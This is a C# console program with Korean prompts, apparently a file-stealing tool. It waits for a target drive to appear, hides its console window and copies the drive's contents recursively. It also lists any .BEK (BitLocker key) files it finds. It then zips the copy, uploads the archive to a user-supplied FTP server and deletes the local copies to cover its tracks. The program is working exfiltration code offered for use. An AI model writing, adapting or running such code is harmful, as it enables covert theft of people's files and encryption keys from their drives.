using System;
using System.IO;
using System.Threading;
using System.Runtime.InteropServices;
using System.IO.Compression;
using System.Net;

namespace VF
{
    class Program
    {
        private static string sourceFilePath = "";
        private static string targetFileURI = "FTP Server";

        private static string userID = "UserID";
        private static string password = "PASS";

        private static string targetPath;
        private static string path;
        private static string Zip = "C:\\result.zip";

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        static string FF;
        static string Temp = "";

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        static void Main(string[] args)
        {
            Console.ForegroundColor = ConsoleColor.Green;
            Console.Write("by HmC_NetWork\n\n\n");
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("ex) I:\\abcd\\" + Environment.NewLine);

            Console.Write("복사할 경로를 입력해주세요 :");
            targetPath = Path.Combine(Console.ReadLine());

            Console.WriteLine("입력됨:" + targetPath);
            Thread.Sleep(100);

            Console.Write("임시로 생성하여 저장될 폴더 경로를 입력해주세요 :");
            path = Path.Combine(Console.ReadLine());

            Console.WriteLine("입력됨:" + path);
            Thread.Sleep(100);

            Console.WriteLine("\n\n\n");
            Console.ForegroundColor = ConsoleColor.Green;
            Console.Write("ex) C:\\result.zip\n");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("zip로 압축하여 저장할 파일의 이름과 경로를 적어주세요 :");
            Zip = Path.Combine(Console.ReadLine());
            sourceFilePath = Path.Combine(Zip);

            Console.WriteLine("\n\n\n");
            Console.ForegroundColor = ConsoleColor.Green;
            Console.Write("ex) ftp://testserver.ipdisk.co.kr/HDD1/testFolder/result.zip"+Environment.NewLine);
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("복사된 파일이 업로드될 FTP서버주소와 경로를 입력해주세요 :");
            targetFileURI = Path.Combine(Console.ReadLine());

            Console.WriteLine("\n\n\n");
            Console.Write("서버접근 아이디 :");
            userID = Path.Combine(Console.ReadLine());
            Console.Write("서버접근 비밀번호 :");
            password = Path.Combine(Console.ReadLine());











            var handle = GetConsoleWindow();

            // Hide
            ShowWindow(handle, SW_HIDE);

            Console.WriteLine("start........");

            copy(targetPath);

            ZipFile.CreateFromDirectory(path, Zip);
            Console.WriteLine("서버로 업로드합니다......");

            Thread.Sleep(2000);
            UploadFTPFile(sourceFilePath, targetFileURI, userID, password);
            Console.WriteLine("완료"+Environment.NewLine+"파일은 서버경로의" +Zip+ "파일로 저장됩니다.");


            Console.WriteLine("압축된 파일을 제거합니다......");
            Thread.Sleep(500);
            File.Delete(sourceFilePath);
            Console.WriteLine("압축파일 제거완료OK......");
            Thread.Sleep(500);

            Console.WriteLine("복사된 파일을 제거합니다......");
            Thread.Sleep(500);
            Del(path);
            Console.WriteLine("파일 제거완료OK......");
            Thread.Sleep(500);

            Console.WriteLine("복사된 디렉토리를 제거합니다......");
            Thread.Sleep(500);
            DirectoryInfo aDir = new DirectoryInfo(path);

            if (aDir.Exists) aDir.Delete(true);

            Console.WriteLine("디렉토리 제거완료OK......");
            Thread.Sleep(500);

            return;

        }


        static void copy(string dir)
        {

            if (!Directory.Exists(targetPath))
            {
                Console.WriteLine("타겟 탐색중........");
                Thread.Sleep(1000);
                copy(targetPath);
            }

            else
            {
                try
                {
                    Console.WriteLine("BEK파일 탐색.......");
                    Thread.Sleep(500);

                    DirectoryInfo DR = new DirectoryInfo(dir);
                    FileInfo[] F;

                    F = DR.GetFiles("*.BEK", SearchOption.AllDirectories);
                    if (F.Length <= 0)
                    {
                        Console.WriteLine("BEK파일 검출되지않음");

                    }
                    else
                    {
                        foreach (FileInfo file in F)
                        {
                            FF = Path.Combine(Convert.ToString(file));
                            Console.WriteLine(FF);
                            Console.WriteLine("BEK파일 검출되었음 정보 저장완료");


                        }
                    }



                    Directory.CreateDirectory(dir.Replace(targetPath, path));
                    Console.WriteLine(dir + " - 폴더 복사");

                    foreach (string name in Directory.GetFiles(dir))
                    {


                        if (name.Replace(targetPath, Temp) == FF)
                        {
                            Console.WriteLine(FF + "제외처리됩");
                        }
                        else
                        {
                            File.Copy(name, name.Replace(targetPath, path), true);
                            Console.WriteLine(name + " - 파일복사");
                        }
                    }

                    foreach (string name in Directory.GetDirectories(dir))
                    {
                        copy(name);
                    }


                }

                catch
                {
                    Console.WriteLine("잘못입력되었습니다.");

                }
            }

        }

        static bool UploadFTPFile(string sourceFilePath, string targetFileURI, string userID, string password)
        {

            Console.WriteLine("시작>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>");

            try
            {
                Uri targetFileUri = new Uri(targetFileURI);

                FtpWebRequest ftpWebRequest = WebRequest.Create(targetFileUri) as FtpWebRequest;

                ftpWebRequest.Credentials = new NetworkCredential(userID, password);
                ftpWebRequest.Method = WebRequestMethods.Ftp.UploadFile;

                FileStream sourceFileStream = new FileStream(sourceFilePath, FileMode.Open, FileAccess.Read);
                Stream targetStream = ftpWebRequest.GetRequestStream();

                byte[] bufferByteArray = new byte[1024];

                while (true)
                {
                    int byteCount = sourceFileStream.Read(bufferByteArray, 0, bufferByteArray.Length);

                    if (byteCount == 0)
                    {
                        break;
                    }

                    targetStream.Write(bufferByteArray, 0, byteCount);
                }

                targetStream.Close();

                sourceFileStream.Close();
            }
            catch
            {
                return false;
            }

            return true;
        }

        static void Del(string dir)
        {

            foreach (string name in Directory.GetFiles(dir))
            {
                Console.WriteLine("catch");
                Console.WriteLine(name.Replace(targetPath, path));

                Thread.Sleep(100);

                File.Delete(name.Replace(targetPath, path));
                Console.WriteLine(name);



            }

            foreach (string name in Directory.GetDirectories(dir))
            {
                Console.WriteLine("name");
                Console.WriteLine(name);
                Thread.Sleep(100);
                Del(name);
            }
        }


    }
}

